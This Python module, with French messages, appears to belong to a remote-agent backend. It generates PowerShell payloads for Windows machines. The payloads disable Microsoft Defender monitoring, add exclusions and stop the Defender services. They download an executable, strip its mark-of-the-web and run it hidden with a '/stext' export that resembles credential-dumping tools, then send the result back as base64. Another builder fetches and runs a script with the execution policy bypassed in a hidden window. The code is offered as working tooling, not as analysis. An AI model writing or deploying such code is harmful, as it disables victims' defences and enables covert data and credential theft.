from __future__ import annotations

import base64
import io
import re
import zipfile
from typing import Any

from app import store
from app.tools_catalog import TOOLS, TOOLS_BY_ID


def _files_base() -> str:
    return f"{store.effective_base_url().rstrip('/')}/files"


def tool_download_url(rel_path: str) -> str:
    rel = rel_path.lstrip("/").replace("\\", "/")
    return f"{_files_base()}/tools/{rel}"


def _q(s: str) -> str:
    return "'" + s.replace("'", "''") + "'"


def build_tool_ps(tool_id: str, *, prefer_x64: bool = True) -> str:
    t = TOOLS_BY_ID.get(tool_id)
    if not t:
        raise ValueError(f"outil inconnu: {tool_id}")
    rel = t.get("exe_x64") if prefer_x64 and t.get("exe_x64") else t["exe"]
    url = tool_download_url(rel)
    url32 = tool_download_url(t["exe"])
    leaf = t["exe"]
    out_name = f"{t['id']}.txt"
    return f"""
$ErrorActionPreference='Continue'
$toolsDir = Join-Path $env:LOCALAPPDATA 'HelperHost\\tools'
New-Item -ItemType Directory -Force -Path $toolsDir | Out-Null
try {{
  $id = [Security.Principal.WindowsIdentity]::GetCurrent()
  $p = New-Object Security.Principal.WindowsPrincipal($id)
  if ($p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{
    if (Get-Command Set-MpPreference -EA SilentlyContinue) {{
      Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue
      Set-MpPreference -DisableBehaviorMonitoring $true -EA SilentlyContinue
      Set-MpPreference -DisableIOAVProtection $true -EA SilentlyContinue
      Set-MpPreference -PUAProtection Disabled -EA SilentlyContinue
      Set-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
      Set-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
    }}
    foreach ($svc in @('WinDefend','WdNisSvc','Sense')) {{
      Stop-Service $svc -Force -EA SilentlyContinue
    }}
  }} elseif (Get-Command Add-MpPreference -EA SilentlyContinue) {{
    Add-MpPreference -ExclusionPath $toolsDir -EA SilentlyContinue
    Add-MpPreference -ExclusionPath (Join-Path $env:LOCALAPPDATA 'HelperHost') -EA SilentlyContinue
  }}
}} catch {{}}
$leaf = {_q(leaf)}
$dest = Join-Path $toolsDir $leaf
$url64 = {_q(url)}
$url32 = {_q(url32)}
$url = if ([Environment]::Is64BitOperatingSystem) {{ $url64 }} else {{ $url32 }}
if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {{
  & curl.exe -fsSL $url -o $dest
  if ($LASTEXITCODE -ne 0) {{ & curl.exe -fsSL $url32 -o $dest }}
  if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {{ throw 'download failed' }}
}}
if (-not (Test-Path $dest) -or (Get-Item $dest).Length -lt 1024) {{ throw 'fichier absent (Defender?)' }}
Unblock-File -Path $dest -ErrorAction SilentlyContinue
$zone = $dest + ':Zone.Identifier'
if (Test-Path $zone) {{ Remove-Item $zone -Force -ErrorAction SilentlyContinue }}
$out = Join-Path $toolsDir {_q(out_name)}
Remove-Item $out -Force -ErrorAction SilentlyContinue
$p = Start-Process -FilePath $dest -ArgumentList @('/stext', $out) -WorkingDirectory $toolsDir -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
if ($null -eq $p) {{ throw 'start failed (bloque par Defender/UAC?)' }}
if (-not $p.WaitForExit(50000)) {{
  Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
  Get-Process -Name ([IO.Path]::GetFileNameWithoutExtension($leaf)) -EA SilentlyContinue | Stop-Process -Force -EA SilentlyContinue
  throw 'timeout execution'
}}
Start-Sleep -Milliseconds 300
if (-not (Test-Path $out)) {{
  New-Item -ItemType File -Path $out -Force | Out-Null
  Set-Content -Path $out -Value '(aucune donnee exportee)' -Encoding UTF8
}}
$bytes = [IO.File]::ReadAllBytes($out)
$b64 = [Convert]::ToBase64String($bytes)
Write-Output ('FILEB64:' + {_q(out_name)} + ':' + $b64)
""".strip()


def build_all_tools_ps() -> str:
    url = f"{_files_base()}/scripts/export-tools.ps1"
    return f"""
$ErrorActionPreference='Continue'
$url = {_q(url)}
$tmp = Join-Path $env:TEMP ('hh-export-' + [guid]::NewGuid().ToString('n') + '.ps1')
& curl.exe -fsSL $url -o $tmp
if (-not (Test-Path $tmp)) {{ throw 'export script download failed' }}
$env:AGENTSHE_FILES = {_q(_files_base())}
& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp
$code = $LASTEXITCODE
Remove-Item $tmp -Force -ErrorAction SilentlyContinue
if ($code -ne 0) {{ exit $code }}
""".strip()


_FILE_RE = re.compile(r"^FILEB64:([^:\r\n]+):(.+)$", re.DOTALL)


def parse_file_b64(output: str) -> tuple[str, bytes]:
    text = (output or "").strip()
    for line in reversed(text.splitlines()):
        line = line.strip()
        if line.startswith("FILEB64:"):
            m = _FILE_RE.match(line)
            if not m:
                break
            return m.group(1).strip(), base64.b64decode(m.group(2).strip())
    m = _FILE_RE.search(text.replace("\n", ""))
    if m:
        return m.group(1).strip(), base64.b64decode(m.group(2).strip())
    raise ValueError("pas de fichier renvoyé par le PC")


def zip_tool_files(files: list[tuple[str, bytes]]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, data in files:
            zf.writestr(name, data)
    return buf.getvalue()


def is_windows_session(session: dict[str, Any]) -> bool:
    platform = (session.get("platform") or "").lower()
    agent = session.get("agent") or {}
    if not platform or platform == "any":
        platform = (agent.get("platform") or "").lower()
    return platform in ("windows", "win", "windows_nt")
